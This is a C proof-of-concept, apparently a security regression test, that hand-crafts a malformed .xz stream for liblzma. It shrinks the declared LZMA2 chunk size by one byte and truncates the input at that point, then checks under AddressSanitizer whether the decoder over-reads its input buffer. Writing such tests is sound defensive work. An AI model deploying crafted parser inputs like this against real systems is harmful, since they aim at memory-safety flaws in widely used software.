// PoC: decode a crafted .xz stream whose first LZMA2 chunk header
// declares a compressed size one byte smaller than the chunk payload
// needs, with the input buffer ending exactly at the declared chunk
// end. The decoder must treat the chunk as truncated (LZMA_OK, more
// input needed); it must not read past the end of the caller's
// input buffer.
//
// Build against the tree under test, e.g.:
//   cc -fsanitize=address -g -I<tree>/src/liblzma/api \
//      pocs/residual.c <build>/liblzma.a -o residual

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <lzma.h>

// Keep sanitizer error reporting deterministic in this environment.
const char *
__asan_default_options(void)
{
	return "print_stats=0:symbolize=0:fast_unwind_on_fatal=0";
}

// A valid .xz stream (LZMA2, CRC32) holding 400 bytes of data.
static const uint8_t stream[] = {
	0xFD,0x37,0x7A,0x58,0x5A,0x00,0x00,0x01,0x69,0x22,0xDE,0x36,
	0x03,0xC0,0x33,0x90,0x03,0x21,0x01,0x16,0x00,0x00,0x00,0x00,
	0xA6,0xC7,0x0A,0x27,0xE0,0x01,0x8F,0x00,0x2B,0x5D,0x00,0x30,
	0x98,0x88,0x98,0x3E,0xCB,0xE2,0x6F,0x34,0xB3,0x4C,0x11,0x5F,
	0x24,0xF5,0xDE,0x9A,0xDB,0xF0,0x6A,0x98,0x24,0x40,0xD4,0xCE,
	0xFA,0x5D,0x43,0xE9,0xC3,0x1E,0x91,0x3C,0xEE,0x15,0xAA,0x5D,
	0x5D,0x75,0x42,0x9A,0xD3,0x42,0x00,0x00,0x7F,0xF0,0x04,0xFC,
	0x00,0x01,0x47,0x90,0x03,0x00,0x00,0x00,0xF7,0x66,0xBB,0x12,
	0x3E,0x30,0x0D,0x8B,0x02,0x00,0x00,0x00,0x00,0x01,0x59,0x5A,
};

int
main(void)
{
	uint8_t comp[sizeof(stream)];
	memcpy(comp, stream, sizeof(stream));

	// Locate the first LZMA2 chunk: 12-byte stream header, then the
	// block header whose size in bytes is (byte[0] + 1) * 4.
	size_t pos = 12;
	pos += ((size_t)comp[pos] + 1) * 4;

	// The first chunk must be an LZMA chunk that sets new properties
	// (control byte >= 0xE0), so the chunk header layout is:
	// control, usize hi, usize lo, csize hi, csize lo, props, data...
	if (comp[pos] < 0xE0) {
		fprintf(stderr, "first chunk is not an LZMA chunk\n");
		return 2;
	}

	// Declare a compressed size one byte smaller than the payload
	// that the encoder actually produced for this chunk.
	size_t csize = ((size_t)comp[pos + 3] << 8) + comp[pos + 4] + 1U;
	if (csize < 2) {
		fprintf(stderr, "unexpected chunk size\n");
		return 2;
	}
	--csize;
	comp[pos + 3] = (uint8_t)((csize - 1) >> 8);
	comp[pos + 4] = (uint8_t)((csize - 1) & 0xFF);

	// Feed the stream truncated exactly at the end of the declared
	// chunk data. This is ordinary streaming usage: the rest of the
	// stream would be supplied in later lzma_code() calls.
	const size_t feed = pos + 6 + csize;
	uint8_t *in = malloc(feed);
	if (in == NULL)
		return 2;
	memcpy(in, comp, feed);

	lzma_stream strm = LZMA_STREAM_INIT;
	if (lzma_stream_decoder(&strm, UINT64_MAX, 0) != LZMA_OK) {
		fprintf(stderr, "lzma_stream_decoder failed\n");
		return 2;
	}

	uint8_t out[1024];
	strm.next_in = in;
	strm.avail_in = feed;
	strm.next_out = out;
	strm.avail_out = sizeof(out);

	const lzma_ret ret = lzma_code(&strm, LZMA_RUN);
	printf("ret=%d (LZMA_OK=%d)\n", (int)ret, (int)LZMA_OK);

	lzma_end(&strm);
	free(in);
	return 0;
}
